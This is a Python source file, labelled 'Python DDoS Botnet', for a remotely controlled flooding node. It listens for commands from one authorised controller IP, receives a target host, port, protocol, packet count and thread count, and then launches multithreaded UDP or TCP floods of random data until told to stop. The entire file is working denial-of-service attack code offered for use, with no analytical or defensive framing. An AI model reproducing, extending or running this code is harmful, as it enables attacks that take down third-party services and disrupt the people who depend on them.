#Author: Menesay

import socket
import random
import threading

print("#########################################")
print("#           Python DDoS Botnet          #")
print("#             Author: Menesay           #")
print("#                  2022                 #")
print("#########################################")


HEADER = 64
PORT = 5050
#SERVER = socket.gethostbyname(socket.gethostname())
SERVER = "0.0.0.0"
ADDR = (SERVER, PORT)
FORMAT = 'utf-8'
DISCONNECT_MESSAGE = "!DISCONNECT"


server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(ADDR)

def handle_client(conn, addr):
    global ip, port, choice, times, threads, start_stop
    print(f"[NEW CONNECTION] {addr} connected.")

    connected = True
    
    # Auth
    # Add your public IP to "1.1.1.1"
    if not "1.1.1.1" in addr: 
        print(f"Access Denied from {addr}")
        conn.send("Access Denied\n".encode(FORMAT))
        connected = False
    
    data_counter=-1
    start_stop = False

    conn.send("Ip/Host, Port, u/t, Times, Threads".encode(FORMAT))
    while connected:
        msg_length = conn.recv(HEADER).decode(FORMAT)
        if msg_length:
            msg_length = int(msg_length)
            msg = conn.recv(msg_length).decode(FORMAT)

            print(f"[{addr}] {msg}")
            conn.send(" ".encode(FORMAT))
            data_counter += 1

            if data_counter == 1:
                print("ip")
                try:
                    ip = str(msg)
                except:
                    ip , port, choice, times, threads = "", 0, "", 0, 0
                    pass

            if data_counter == 2:
                print("port")
                try:
                    port = int(msg)
                except:
                    ip , port, choice, times, threads = "", 0, "", 0, 0
                    pass

            if data_counter == 3:
                print("choice")
                try:
                    choice = str(msg)
                except:
                    ip , port, choice, times, threads = "", 0, "", 0, 0
                    pass

            if data_counter == 4:
                print("times")
                try:
                    times = int(msg)
                except:
                    ip , port, choice, times, threads = "", 0, "", 0, 0
                    pass

            if data_counter == 5:
                print("threads")
                try:
                    threads = int(msg)
                except:
                    ip , port, choice, times, threads = "", 0, "", 0, 0
                    pass

            if msg == "duvi":
                print("Duvi")
                new()

            if msg == "duvidur":
                print("Duvidur")
                start_stop = False
                
            if msg == DISCONNECT_MESSAGE:
                connected = False

    conn.close()


def udp():
        global start_stop
        start_stop = True
        data = random._urandom(1024)
        i = random.choice(("[*]","[!]","[#]"))
        while start_stop == True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                addr = (str(ip),int(port))
                for x in range(times):
                    s.sendto(data,addr)
                print(i +"UDP Sent!!!")
            except:
                s.close()
                print("[!] Error!!!")


def tcp():
        global start_stop
        start_stop = True
        data = random._urandom(16)
        i = random.choice(("[*]","[!]","[#]"))
        while start_stop == True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip,port))
                s.send(data)
                for x in range(times):
                    s.send(data)
                print(i +"TCP Sent!!!")
            except:
                s.close()
                print("[*] Error")

def new():
        for y in range(threads):
            if choice == 'u':
                th = threading.Thread(target = udp)
                th.start()
            else:
                th = threading.Thread(target = tcp)
                th.start()

def start():
    server.listen()
    print(f"[LISTENING] Server is listening on {SERVER}")
    while True:
        conn, addr = server.accept()
        thread = threading.Thread(target=handle_client, args=(conn, addr))
        thread.start()
        print(f"[ACTIVE CONNECTIONS] {threading.active_count() - 1}")

if __name__ == '__main__':
    start()
